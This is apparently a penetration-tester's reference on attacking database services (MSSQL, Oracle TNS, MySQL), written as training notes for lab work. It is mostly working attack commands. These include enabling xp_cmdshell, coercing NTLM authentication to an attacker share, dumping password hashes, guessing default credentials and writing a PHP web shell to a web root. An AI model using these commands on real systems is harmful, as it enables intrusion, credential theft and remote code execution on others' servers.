---
title: "Database Services — MSSQL, Oracle TNS, MySQL"
description: "Enumeration and access paths for Microsoft SQL Server, Oracle TNS listener, and MySQL/MariaDB."
category: "Field Manual"
tags: ["field-manual", "cpts", "mssql", "oracle", "mysql", "databases"]
date: 2026-11-11
published: true
status: archive
---

# Database Services

## MSSQL (1433, 1434, 2433)

### Cheatsheet

```bash
nmap -p1433 --script ms-sql-info,ms-sql-ntlm-info,ms-sql-empty-password,ms-sql-config $IP
impacket-mssqlclient "$DOMAIN/$USER:$PASS@$IP" -windows-auth
impacket-mssqlclient "$USER:$PASS@$IP"
nxc mssql $IP -u "$USER" -p "$PASS" -d "$DOMAIN" -q "SELECT @@version"
sqlcmd -S $IP -U sa -P "$PASS" -Q "SELECT @@version"
```

| Command | Description |
|---|---|
| `locate mssqlclient` | Find the packaged executable and Impacket example script. |
| `mssqlclient.py '<user>@<FQDN/IP>' -windows-auth` | Connect with Windows authentication and prompt for the password. |
| `msfconsole -q -x 'use auxiliary/scanner/mssql/mssql_ping; set RHOSTS 10.10.10.20; run; exit'` | Discover SQL Server names, instances, versions, ports, and named-pipe endpoints. |

Expanded NSE checks for the selected instance, using the example blank `sa` password:

```bash
sudo nmap 10.10.10.20 -sV -p1433 \
  --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes \
  --script-args 'mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER'
```

The expanded set includes command-execution and password-hash checks as well as discovery. Record the instance name, database TCP port, DAC port, and named-pipe path separately; SQL Server Browser discovery commonly uses UDP 1434.

### Methodology

- [ ] Version, instance name, NTLM info (domain/host leak).
- [ ] SQL auth vs Windows auth; try `sa` and domain accounts.
- [ ] Enumerate databases, tables, and columns; look for credentials and PII.
- [ ] Check `xp_cmdshell`, `OLE Automation`, `sp_oacreate`.
- [ ] Check impersonation and `sysadmin` membership.
- [ ] Enumerate linked servers; they often bridge to another host.
- [ ] File read/write and NTLM coercion (`xp_dirtree`).

### Access

```bash
# Windows auth
impacket-mssqlclient "$DOMAIN/$USER:$PASS@$IP" -windows-auth

# SQL auth
impacket-mssqlclient "sa:$PASS@$IP"
```

Inside the client:

```sql
SELECT @@version;
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');
SELECT name FROM sys.databases;
```

### System databases

| Database | Purpose |
|---|---|
| `master` | Instance-wide system configuration and metadata. |
| `model` | Template used when creating databases. |
| `msdb` | SQL Server Agent jobs, scheduling, alerts, and related history. |
| `tempdb` | Temporary objects and intermediate results. |
| `resource` | Read-only system objects shipped with SQL Server. |

SSMS is a client application and can be installed on an administrator's workstation as well as the database host. Client configuration, saved connection details, and discovered named pipes can reveal additional instances.

### Command execution

```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

In Impacket:

```text
enable_xp_cmdshell
xp_cmdshell whoami
```

If `xp_cmdshell` is blocked, try OLE Automation (`sp_OACreate` + `sp_OAMethod`) or CLR assembly execution if enabled.

### Impersonation

```sql
SELECT DISTINCT b.name
FROM sys.server_permissions a
JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE';

EXECUTE AS LOGIN = 'sa';
SELECT SYSTEM_USER;
```

### Linked servers

```sql
EXEC sp_linkedservers;
SELECT * FROM OPENQUERY("LINKED", 'SELECT @@version');
EXEC ('xp_cmdshell ''whoami''') AT [LINKED];
```

Linked servers with `sysadmin` on the remote instance are a direct path to another host.

### NTLM coercion

```sql
EXEC master..xp_dirtree '\\10.10.14.5\share';
```

Capture the Net-NTLMv2 hash with Responder and relay or crack it.

### File read/write

```sql
SELECT * FROM OPENROWSET(BULK 'C:\Windows\win.ini', SINGLE_CLOB) AS x;
```

Write access usually requires `sysadmin` and a writable path; prefer `xp_cmdshell` for file operations.

## Oracle TNS (1521)

### Cheatsheet

```bash
nmap -p1521 --script oracle-tns-version,oracle-sid-brute $IP
odat sidguesser -s $IP -p 1521
odat passwordguesser -s $IP -p 1521 -d XE
odat all -s $IP -p 1521 -d XE -U scott -P tiger
sqlplus $USER/$PASS@$IP:1521/$SID
```

| Command | Description |
|---|---|
| `./odat.py -h` | Check the installed ODAT entry point and available modules. |
| `./odat.py all -s <FQDN/IP>` | Start ODAT's combined discovery and testing workflow without a preselected SID or account. |
| `sqlplus 'scott/tiger@10.10.10.20:1521/XE as sysdba'` | Attempt a SYSDBA connection using an account granted that administrative privilege. |

The `all` workflow includes credential and exploitation modules. Appending `as sysdba` is not a privilege bypass by itself; remote administrative authentication must permit the account.

### Methodology

- [ ] TNS version and listener status.
- [ ] SID or service name (`XE`, `ORCL`, `XEPDB1`).
- [ ] Default accounts: `scott/tiger`, `system/manager`, `sys/change_on_install`, `dbsnmp/dbsnmp`.
- [ ] Privilege level: normal user vs DBA.
- [ ] File read/write via `UTL_FILE`, Java, or `DBMS_SCHEDULER`.
- [ ] Command execution via PL/SQL if DBA.

### Notes

`odat` automates SID guessing, credential attacks, and post-exploitation modules. `sqlplus` is the native client:

```sql
SELECT * FROM v$version;
SELECT * FROM dba_users;
SELECT * FROM dba_role_privs WHERE grantee = USER;
```

Oracle is less common than MSSQL in CPTS labs but can appear as a legacy internal service. Default credentials are worth trying before brute force.

### Oracle catalog queries

Run these in SQL*Plus after connecting:

| Command | Description |
|---|---|
| `SELECT table_name FROM all_tables;` | List tables accessible to the current account. |
| `SELECT * FROM user_role_privs;` | Inspect roles granted to the current user. |
| `SELECT name, password FROM sys.user$;` | Read legacy Oracle password verifiers when privileges permit. |

The `PASSWORD` column holds older verifier formats and may be empty on newer versions; an empty field does not establish that an account has a blank password.

### Listener and client configuration

| File / field | Enumeration value |
|---|---|
| `$ORACLE_HOME/network/admin/tnsnames.ora` | Client connection aliases, destination hosts, ports, and service names. |
| `$ORACLE_HOME/network/admin/listener.ora` | Listener bindings and configured database-instance descriptors. |
| `ADDRESS`, `PROTOCOL`, `HOST`, `PORT` | Network endpoint used by the connection descriptor. |
| `CONNECT_DATA`, `SERVICE_NAME`, `SID`, `INSTANCE_NAME` | Requested service or instance identity; retain the exact field name. |
| `TRACE_LEVEL`, `TRACE_DIRECTORY`, `TRACE_FILE_NAME` | Trace verbosity and potential diagnostic-file locations. |
| `CONNECT_TIMEOUT`, `RECEIVE_TIMEOUT`, `SEND_TIMEOUT` | Connection and I/O timeout behavior. |

The slash component in an Easy Connect string such as `host:1521/XE` names a service. A SID identifies an instance; the two are not interchangeable even when a lab uses the same value for both. Configuration may also be relocated with `TNS_ADMIN`.

For an already-extracted Instant Client 21.12 basic/SQL*Plus pair in the current directory:

```bash
export LD_LIBRARY_PATH="$PWD/instantclient_21_12${LD_LIBRARY_PATH:+:$LD_LIBRARY_PATH}"
export PATH="$PWD/instantclient_21_12:$PATH"
```

These exports make the client executable and shared libraries available to the current shell. Match the directory to the installed version when troubleshooting `libsqlplus.so` loader errors.

### UTL_FILE upload verification

This example writes a text marker through a privileged Oracle session and verifies it through an IIS web root on the same host:

```bash
echo 'Oracle File Upload Test' > testing.txt
./odat.py utlfile -s 10.10.10.20 -d XE -U scott -P tiger --sysdba --putFile 'C:\inetpub\wwwroot' testing.txt ./testing.txt
curl -X GET http://10.10.10.20/testing.txt
```

`--putFile` takes the remote directory, remote filename, and local file in that order. A Linux web root may be `/var/www/html`; use the actual web-server path and the Oracle service account's effective write permissions.

## MySQL / MariaDB (3306)

### Cheatsheet

```bash
nmap -p3306 --script mysql-info,mysql-enum,mysql-empty-password,mysql-databases,mysql-users,mysql-variables $IP
mysql -h $IP -u root -p
nxc mysql $IP -u root -p '' --local-auth
```

| Command | Description |
|---|---|
| `mysql -u root -h 10.10.10.20` | Independently test a scanner's claim that root accepts an empty password. |
| `mysql -u <user> -p'<password>' -h <FQDN/IP>` | Connect with an inline password; there is no space after `-p`. |
| `sudo nmap 10.10.10.20 -sV -sC -p3306 --script 'mysql*'` | Run installed MySQL script-family checks, including credential and vulnerability probes. |

Confirm reported accounts with the native client: a script can report an empty password while the server rejects a login without a password. The quoted wildcard is expanded by Nmap rather than the shell.

### Methodology

- [ ] Version and auth plugin.
- [ ] Blank/root password, default accounts, credentials from configs.
- [ ] Enumerate databases, users, grants, and variables.
- [ ] Look for application credentials and password hashes.
- [ ] File read with `LOAD_FILE` (requires `FILE` privilege and `secure_file_priv`).
- [ ] File write with `INTO OUTFILE` to a web root (requires `FILE` and writable path).
- [ ] UDF/plugin execution if the plugin directory is writable.

### Commands

```sql
SELECT VERSION();
SHOW DATABASES;
SELECT user, host, authentication_string FROM mysql.user;
SHOW GRANTS FOR CURRENT_USER();
SELECT @@secure_file_priv;
SELECT LOAD_FILE('/etc/passwd');
```

For an application database named `appdb` with a `users` table:

| Command | Description |
|---|---|
| `USE appdb;` | Select an accessible application database. |
| `SHOW TABLES;` | List tables in the selected database. |
| `SHOW COLUMNS FROM users;` | Inspect column names and types before querying data. |
| `SELECT * FROM users;` | Retrieve records from a selected table. |
| `SELECT * FROM users WHERE username = 'admin';` | Filter rows using a known column and value. |
| `USE sys;` | Select MySQL's diagnostic system schema. |
| `SELECT host, unique_users FROM host_summary;` | Identify client hosts and observed user counts when the sys view is available. |

`information_schema` exposes database metadata, `mysql` contains account and grant data, `performance_schema` provides instrumentation, and `sys` offers diagnostic views over that instrumentation.

Write a web shell:

```sql
SELECT '<?php system($_GET["cmd"]); ?>'
INTO OUTFILE '/var/www/html/shell.php';
```

`INTO OUTFILE` fails if the file exists, `secure_file_priv` is set, or the directory is not writable by the DB user.

### Notes

MySQL often exposes application data rather than OS access. Search tables for users, sessions, API keys, and password reset tokens. If you find `root` with `FILE`, check the web root early.

### MySQL server configuration

| Command | Description |
|---|---|
| `cat /etc/mysql/mysql.conf.d/mysqld.cnf \| grep -v '#' \| sed -r '/^\s*$/d'` | Inspect the service account, bindings, data directory, and included configuration paths. |

| Setting | Enumeration implication |
|---|---|
| `user` | Operating-system account running the database service. |
| `port`, `socket` | TCP and local Unix-socket endpoints. |
| `datadir` | Database storage directory. |
| `admin_address` | Separate administrative-interface binding where supported. |
| `password` | Plaintext credentials may appear in client configuration sections. |
| `debug`, `sql_warnings` | Diagnostic behavior that may expose additional application context. |
| `secure_file_priv` | Restricts server-side file import/export. |

For `secure_file_priv`, a directory restricts operations to that location, an empty string adds no directory restriction, and `NULL` disables those file operations where supported. File privileges and operating-system permissions are still required.

## Pitfalls

- MSSQL Windows auth uses the current OS identity unless you pass explicit credentials.
- `xp_cmdshell` is disabled by default in modern SQL Server; enabling it requires `sysadmin`.
- Oracle SIDs and service names are different; `odat sidguesser` handles both.
- MySQL `root` may be restricted to `localhost`; use the app's credentials or a tunnel.
- Database ports are often firewalled internally; pivot before concluding they are closed.

## References

- [HackTricks — MSSQL](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mssql-microsoft-sql-server/index.html)
- [HackTricks — Oracle](https://book.hacktricks.wiki/en/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener.html)
- [HackTricks — MySQL](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mysql.html)
- [odat](https://github.com/quentinhardy/odat)
- [Impacket mssqlclient](https://github.com/fortra/impacket)
